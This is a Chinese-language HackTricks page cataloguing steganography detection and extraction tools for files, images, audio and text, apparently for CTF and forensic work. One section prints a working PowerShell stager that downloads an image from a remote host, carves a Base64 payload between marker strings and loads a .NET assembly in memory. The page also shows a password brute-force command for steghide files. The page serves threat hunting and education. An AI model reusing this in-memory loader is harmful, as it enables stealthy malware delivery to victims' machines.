# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **从文件提取数据**

### **Binwalk**

用于在二进制文件中搜索嵌入的隐藏文件和数据的工具。可通过 `apt` 安装，其源代码可在 [GitHub](https://github.com/ReFirmLabs/binwalk) 获取。
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

根据文件头和文件尾恢复文件，适用于 png 图像。可通过 `apt` 安装，源代码托管在 [GitHub](https://github.com/korczis/foremost)。
```bash
foremost -i file # Extracts data
```
### **Exiftool**

用于查看文件的 metadata，可在 [here](https://www.sno.phy.queensu.ca/~phil/exiftool/)。
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

类似 exiftool，用于查看元数据。可通过 `apt` 安装，源码托管在 [GitHub](https://github.com/Exiv2/exiv2)，并且有一个 [official website](http://www.exiv2.org/)。
```bash
exiv2 file # Shows the metadata
```
### **File**

识别你正在处理的文件类型。

### **Strings**

从文件中提取可读字符串，使用各种编码设置来过滤输出。
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **比较 (cmp)**

用于将修改过的文件与在网上找到的原始版本进行比较。
```bash
cmp original.jpg stego.jpg -b -l
```
## **从文本中提取隐藏数据**

### **空格中的隐藏数据**

看似空白的空格中可能含有不可见字符，从而隐藏信息。要提取这些数据，请访问 [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **从图像中提取数据**

### **使用 GraphicMagick 识别图像细节**

[GraphicMagick](https://imagemagick.org/script/download.php) 用于确定图像文件类型并识别潜在的损坏。执行下面的命令来检查图像：
```bash
./magick identify -verbose stego.jpg
```
要尝试修复受损的图像，添加一个元数据注释可能有帮助：
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide 用于数据隐藏**

Steghide 可以在 `JPEG, BMP, WAV, and AU` 文件中隐藏数据，能够嵌入并提取加密数据。可使用 `apt` 直接安装，其源码可在 GitHub 获取（https://github.com/StefanoDeVuono/steghide）。

**命令：**

- `steghide info file` 可查看文件是否包含隐藏数据。
- `steghide extract -sf file [--passphrase password]` 提取隐藏数据，密码为可选。

如需通过网页提取，请访问 [this website](https://futureboy.us/stegano/decinput.html)。

**使用 Stegcracker 进行暴力破解：**

- 若要对 Steghide 尝试密码破解，可使用 [stegcracker](https://github.com/Paradoxis/StegCracker.git) 如下：
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg 用于 PNG 和 BMP 文件**

zsteg 专注于发现 PNG 和 BMP 文件中的隐藏数据。安装通过 `gem install zsteg` 完成，其 [source on GitHub](https://github.com/zed-0xff/zsteg)。

**命令：**

- `zsteg -a file` 对文件应用所有检测方法。
- `zsteg -E file` 指定用于数据提取的 payload。

### **StegoVeritas 和 Stegsolve**

**stegoVeritas** 会检查元数据、执行图像变换，并应用 LSB brute forcing 等功能。使用 `stegoveritas.py -h` 查看完整选项列表，使用 `stegoveritas.py stego.jpg` 执行所有检查。

**Stegsolve** 会应用各种颜色滤镜以揭示图像中的隐藏文本或信息。可在 [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) 获取。

### **FFT 用于隐藏内容检测**

Fast Fourier Transform (FFT) 技术可以揭示图像中隐藏的内容。 有用的资源包括：

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy 用于音频和图像文件**

Stegpy 允许在图像和音频文件中嵌入信息，支持格式如 PNG、BMP、GIF、WebP 和 WAV。可在 [GitHub](https://github.com/dhsdshdhk/stegpy) 获取。

### **Pngcheck 用于 PNG 文件分析**

要分析 PNG 文件或验证其真实性，请使用：
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **用于图像分析的其他工具**

如需进一步探索，请访问：

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## 在图像中通过标记分隔的 Base64 载荷（malware delivery）

许多 commodity loaders 越来越频繁地将 Base64 编码的载荷作为纯文本嵌入到本来有效的图像中（通常为 GIF/PNG）。与像素级 LSB 不同，载荷由嵌入在文件文本/元数据中的唯一起始/结束标记字符串分隔。然后 PowerShell stager 会：

- 通过 HTTP(S) 下载图像
- 定位标记字符串（观测到的示例：<<sudo_png>> … <<sudo_odt>>）
- 提取两标记之间的文本并对其进行 Base64 解码为字节
- 在内存中加载 .NET assembly 并调用已知入口方法（不在磁盘写入文件）

最小 PowerShell carving/loading 代码片段
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
说明
- 这属于 ATT&CK T1027.003 (steganography)。标记字符串因活动而异。
- 威胁狩猎：扫描下载的图像以查找已知分隔符；标记使用 `DownloadString` 后跟 `FromBase64String` 的 `PowerShell`。

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **从音频中提取数据**

**Audio steganography** 提供了一种在音频文件中隐藏信息的独特方法。不同的工具用于嵌入或提取隐藏内容。

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide 是一个多功能工具，用于在 JPEG、BMP、WAV 和 AU 文件中隐藏数据。详细说明见 [stego tricks documentation](stego-tricks.md#steghide)。

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

该工具兼容包括 PNG、BMP、GIF、WebP 和 WAV 在内的多种格式。更多信息请参见 [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)。

### **ffmpeg**

ffmpeg 对评估音频文件的完整性至关重要，可显示详细信息并定位任何差异。
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg 擅长使用最低有效位 (LSB) 策略在 WAV 文件中隐藏和提取数据。可在 [GitHub](https://github.com/ragibson/Steganography#WavSteg) 获取。命令包括：
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound 允许使用 AES-256 在音频文件中加密并检测信息。它可以从 [the official page](http://jpinsoft.net/deepsound/download.aspx) 下载。

### **Sonic Visualizer**

作为对音频文件进行可视化与分析检查的宝贵工具，Sonic Visualizer 能揭示其他手段无法检测的隐藏元素。更多信息请访问 [official website](https://www.sonicvisualiser.org/)。

### **DTMF Tones - Dial Tones**

在音频文件中检测 DTMF tones 可以使用在线工具，例如 [this DTMF detector](https://unframework.github.io/dtmf-detect/) 和 [DialABC](http://dialabc.com/sound/detect/index.html)。

## **Other Techniques**

### **Binary Length SQRT - QR Code**

二进制数据的长度开根号为整数时，可能表示一个 QR code。使用此片段进行检查：
```python
import math
math.sqrt(2500) #50
```
要将二进制转换为图像，请查看 [dcode](https://www.dcode.fr/binary-image)。要读取 QR 码，请使用 [this online barcode reader](https://online-barcode-reader.inliteresearch.com/)。

### **盲文翻译**

要翻译盲文，请使用 [Branah Braille Translator](https://www.branah.com/braille-translator)，这是一个极好的资源。

## **参考资料**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
